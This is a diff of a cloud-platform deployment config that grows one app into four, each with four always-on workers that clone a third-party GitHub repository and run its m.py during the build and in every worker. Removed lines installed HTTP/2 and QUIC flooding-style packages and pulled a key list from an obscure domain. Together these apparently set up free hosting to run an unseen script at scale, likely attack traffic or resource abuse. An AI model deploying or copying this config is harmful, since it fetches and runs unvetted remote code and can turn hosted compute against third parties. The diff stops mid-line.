@@ -1,39 +1,22 @@
 applications:
-  myapp:
+  myapp1:
     type: 'nodejs:24'
-
     build:
       flavor: none
-
     hooks:
       build: |
+        echo "BUILD COMMAND FOR myapp1"
         apt-get update
-        apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
-
-        pip3 install --upgrade pip
-        pip3 install aioquic uvloop requests
-
-        npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
-
-        curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
-
+        apt-get install -y python3 python3-pip git curl
+        pip3 install --upgrade pip requests
         git clone https://github.com/vrbrh921-glitch/Fc.git
         cd Fc
-        echo "Running python during BUILD"
         python3 m.py
-
-    # Web container (required but unused)
     web:
       commands:
         start: "true"
       locations:
-        "/":
-          passthru: true
-          allow: true
-
-    # =========================
-    # 4 × 24/7 PYTHON WORKERS
-    # =========================
+        "/": { passthru: true, allow: true }
     workers:
       runner1:
         size: S
@@ -42,9 +25,7 @@ applications:
             cd Fc
             export INSTANCE_NUMBER=1
             export TOTAL_INSTANCES=4
-            export RUNNER_OS=upsun
             exec python3 m.py
-
       runner2:
         size: S
         commands:
@@ -52,9 +33,7 @@ applications:
             cd Fc
             export INSTANCE_NUMBER=2
             export TOTAL_INSTANCES=4
-            export RUNNER_OS=upsun
             exec python3 m.py
-
       runner3:
         size: S
         commands:
@@ -62,9 +41,7 @@ applications:
             cd Fc
             export INSTANCE_NUMBER=3
             export TOTAL_INSTANCES=4
-            export RUNNER_OS=upsun
             exec python3 m.py
-
       runner4:
         size: S
         commands:
@@ -72,5 +49,144 @@ applications:
             cd Fc
             export INSTANCE_NUMBER=4
             export TOTAL_INSTANCES=4
-            export RUNNER_OS=upsun
             exec python3 m.py
+
+  myapp2:
+    type: 'nodejs:24'
+    build:
+      flavor: none
+    hooks:
+      build: |
+        echo "BUILD COMMAND FOR myapp2"
+        apt-get update
+        apt-get install -y python3 python3-pip git curl
+        pip3 install --upgrade pip aioquic uvloop
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+    web:
+      commands:
+        start: "true"
+      locations:
+        "/": { passthru: true, allow: true }
+    workers:
+      runner1:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=1
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner2:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=2
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner3:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=3
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner4:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=4
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+
+  myapp3:
+    type: 'nodejs:24'
+    build:
+      flavor: none
+    hooks:
+      build: |
+        echo "BUILD COMMAND FOR myapp3"
+        apt-get update
+        apt-get install -y python3 python3-pip git curl
+        pip3 install --upgrade pip uvloop aiohttp
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+    web:
+      commands:
+        start: "true"
+      locations:
+        "/": { passthru: true, allow: true }
+    workers:
+      runner1:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=1
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner2:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=2
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner3:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=3
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner4:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=4
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+
+  myapp4:
+    type: 'nodejs:24'
+    build:
+      flavor: none
+    hooks:
+      build: |
+        echo "BUILD COMMAND FOR myapp4"
+        apt-get update
+        apt-get install -y python3 python3-pip git curl
+        pip3 install --upgrade pip httpx aioquic
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+    web:
+      commands:
+        start: "true"
+      locations:
+        "/": { passthru: true, allow: true }
+    workers:
+      runner1:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=1
+            export TOTAL_INSTANCES=4
+            exec python3 m.py
+      runner2:
+        size: S
+        commands:
+          start: |
+            cd Fc
+            export INSTANCE_NUMBER=2
+            export TOTAL_INSTANCES=4
+            exec python3 m
